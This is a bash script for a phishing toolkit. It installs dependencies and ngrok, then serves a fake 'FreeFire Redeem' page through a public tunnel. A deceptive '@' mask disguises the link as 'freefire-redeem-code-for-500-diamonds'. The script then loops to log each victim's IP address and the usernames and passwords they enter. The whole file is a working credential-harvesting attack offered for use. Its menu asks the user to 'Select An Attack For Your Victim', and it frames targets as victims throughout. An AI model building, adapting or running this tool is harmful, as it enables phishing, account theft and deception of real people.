#!/bin/bash

RED="$(printf '\033[31m')" GREEN="$(printf '\033[32m')" ORANGE="$(printf '\033[33m')" BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')" CYAN="$(printf '\033[36m')" WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
REDBG="$(printf '\033[41m')" GREENBG="$(printf '\033[42m')" ORANGEBG="$(printf '\033[43m')" BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')" CYANBG="$(printf '\033[46m')" WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
RESETBG="$(printf '\e[0m\n')"

exit_on_signal_SIGINT() {
	{
		printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Interrupted." 2>&1
		reset_color
	}
	exit 0
}

exit_on_signal_SIGTERM() {
	{
		printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Terminated." 2>&1
		reset_color
	}
	exit 0
}

trap exit_on_signal_SIGINT SIGINT
trap exit_on_signal_SIGTERM SIGTERM

reset_color() {
	tput sgr0
	tput op
	return
}

kill_pid() {
	if [[ $(pidof php) ]]; then
		killall php >/dev/null 2>&1
	fi
	if [[ $(pidof ngrok) ]]; then
		killall ngrok >/dev/null 2>&1
	fi
}

banner() {
	cat <<-EOF
		${ORANGE} ___                        ___    _               _                  
		${ORANGE}(  _ \                     (  _ \ ( )     _       ( )                 
		${ORANGE}| (_(_) _ __    __     __  | |_) )| |__  (_)  ___ | |__     __   _ __ 
		${ORANGE}|  _)  ( |__) / __ \ / __ \|  __/ |  _  \| |/  __)|  _  \ / __ \(  __)
		${ORANGE}| |    | |   (  ___/(  ___/| |    | | | || |\__  \| | | |(  ___/| |   
		${ORANGE}(_)    (_)    \____) \____)(_)    (_) (_)(_)(____/(_) (_) \____)(_)   
		${RED} Version : 1.0
	EOF
}

banner_small() {
	cat <<-EOF
		${BLUE} ┌──────────────────────────────────────────────┐
		${BLUE} │▌ ▌      ▌  ▗         ▞▀▖▐        ▐       ▌ ▐ │
		${BLUE} │▙▄▌▝▀▖▞▀▖▌▗▘▄ ▛▀▖▞▀▌  ▚▄ ▜▀ ▝▀▖▙▀▖▜▀ ▞▀▖▞▀▌ ▐ │
		${BLUE} │▌ ▌▞▀▌▌ ▖▛▚ ▐ ▌ ▌▚▄▌  ▖ ▌▐ ▖▞▀▌▌  ▐ ▖▛▀ ▌ ▌ ▝ │
		${BLUE} │▘ ▘▝▀▘▝▀ ▘ ▘▀▘▘ ▘▗▄▘  ▝▀  ▀ ▝▀▘▘   ▀ ▝▀▘▝▀▘ ▝ │
		${BLUE} └──────────────────────────────────────────────┘
		${WHITE} By KumarLakshmanan
	EOF
}

dependencies() {
	clear
	if [[ -d "/data/data/com.termux/files/home" ]]; then
		if [[ $(command -v proot) ]]; then
			printf ''
		else
			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}proot${CYAN}"${WHITE}
			pkg install proot resolv-conf -y
		fi
	fi

	if [[ $(command -v php) && $(command -v wget) && $(command -v curl) && $(command -v unzip) ]]; then
		echo ""
	else
		pkgs=(php curl wget unzip)
		for pkg in "${pkgs[@]}"; do
			type -p "$pkg" &>/dev/null || {
				echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}$pkg${CYAN}"${WHITE}
				if [[ $(command -v pkg) ]]; then
					pkg install "$pkg"
				elif [[ $(command -v apt) ]]; then
					apt install "$pkg" -y
				elif [[ $(command -v apt-get) ]]; then
					apt-get install "$pkg" -y
				elif [[ $(command -v pacman) ]]; then
					sudo pacman -S "$pkg" --noconfirm
				elif [[ $(command -v dnf) ]]; then
					sudo dnf -y install "$pkg"
				else
					echo -e "\n${RED}[${WHITE}!${RED}]${RED} Unsupported package manager, Install packages manually."
					{
						reset_color
						exit 1
					}
				fi
			}
		done
	fi

}

download_ngrok() {
	echo -e "\n${GREEN}Downloading ${GREEN} $1"
	echo -e "\n${GREEN}Please wait ...${GREEN}"
	url="$1"
	file=$(basename $url)
	if [[ -e "$file" ]]; then
		rm -rf "$file"
	fi
	wget --no-check-certificate "$url" >/dev/null 2>&1
	if [[ -e "$file" ]]; then
		unzip "$file" >/dev/null 2>&1
		mv -f ngrok .server/ngrok >/dev/null 2>&1
		rm -rf "$file" >/dev/null 2>&1
		chmod +x .server/ngrok >/dev/null 2>&1
		main_menu
	else
		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured, Install Ngrok manually."
		{
			reset_color
			exit 1
		}
	fi
}

install_ngrok() {
	if [[ -e ".server/ngrok" ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Ngrok already installed."
	else
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing ngrok..."${WHITE}
		arch=$(uname -m)
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm64.zip'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip'
		else
			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip'
		fi
	fi

}

msg_exit() {
	{
		clear
		banner
		echo
	}
	echo -e "${GREENBG}${BLACK} Thank you for using this tool. Have a good day.${RESETBG}\n"
	{
		reset_color
		exit 0
	}
}

about() {
	{
		clear
		banner
		echo
	}
	cat <<-EOF
		${GREEN}Author    ${RED}:  ${ORANGE}KumarLakshmanan ${ORANGE}${RED}[ Mr_X_Hacker ${RED}]
		${GREEN}Website   ${RED}:  ${ORANGE}https://www.codingfrontend.com ${ORANGE}
		${GREEN}Youtube   ${RED}:  ${ORANGE}https://youtube.com/c/CodingFrontend ${ORANGE}

		${RED}[${WHITE}99${RED}]${ORANGE} Return Home         ${RED}[${WHITE}00${RED}]${ORANGE} Exit
	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"

	if [[ "$REPLY" == 0 || "$REPLY" == 00 ]]; then
		msg_exit
	elif [[ "$REPLY" == 9 || "$REPLY" == 99 ]]; then
		echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Returning to main menu..."
		{
			sleep 1
			main_menu
		}
	else
		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
		{
			sleep 1
			about
		}
	fi
}

HOST='127.0.0.1'
PORT='8080'

setup_site() {
	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server..."${WHITE}
	cd .server/www && php -S "$HOST":"$PORT" >/dev/null 2>&1 &
}

capture_ip() {
	IP=$(grep -a 'IP:' .server/www/ip.txt | cut -d " " -f2 | tr -d '\r')
	IFS=$'\n'
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Victim's IP : ${BLUE}$IP"
	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}ip.txt"
	cat .server/www/ip.txt >>ip.txt
}

capture_creds() {
	ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | cut -d " " -f2)
	PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | cut -d ":" -f2)
	IFS=$'\n'
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Account : ${BLUE}$ACCOUNT"
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Password : ${BLUE}$PASSWORD"
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}usernames.txt"
	cat .server/www/usernames.txt >>usernames.txt
	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Next Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit. "
}

capture_data() {
	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit..."
	while true; do
		if [[ -e ".server/www/ip.txt" ]]; then
			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} One Victim Clicked the Link and his/her IP is logged !"
			capture_ip
			rm -rf .server/www/ip.txt
		fi
		sleep 0.75
		if [[ -e ".server/www/usernames.txt" ]]; then
			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Login info Found !"
			capture_creds
			rm -rf .server/www/usernames.txt
		fi
		sleep 0.75
	done
}

start_ngrok() {
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
	{
		sleep 1
		setup_site
	}
	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Ngrok..."

	if [[ $(command -v termux-chroot) ]]; then
		sleep 2 && termux-chroot ./.server/ngrok http "$HOST":"$PORT" >/dev/null 2>&1 &
	else
		sleep 2 && ./.server/ngrok http "$HOST":"$PORT" >/dev/null 2>&1 &
	fi

	{
		sleep 8
		clear
		banner_small
	}
	ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
	ngrok_url1=${ngrok_url#https://}
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$ngrok_url"
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$mask@$ngrok_url1"
	capture_data
}

main_menu() {
	{
		clear
		banner
		echo
	}
	cat <<-EOF
		${RED}[${WHITE}::${RED}]${ORANGE} Select An Attack For Your Victim ${RED}[${WHITE}::${RED}]${ORANGE}

		${RED}[${WHITE}01${RED}]${ORANGE} FreeFire Redeem Page Phishing
		${RED}[${WHITE}99${RED}]${ORANGE} About
		${RED}[${WHITE}00${RED}]${ORANGE} Exit

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"

	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
		mask='http://freefire-redeem-code-for-500-diamonds'
		start_ngrok
	elif [[ "$REPLY" == 99 ]]; then
		about
	elif [[ "$REPLY" == 0 || "$REPLY" == 00 ]]; then
		msg_exit
	else
		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
		{
			sleep 1
			main_menu
		}
	fi
}

kill_pid
dependencies
install_ngrok
main_menu
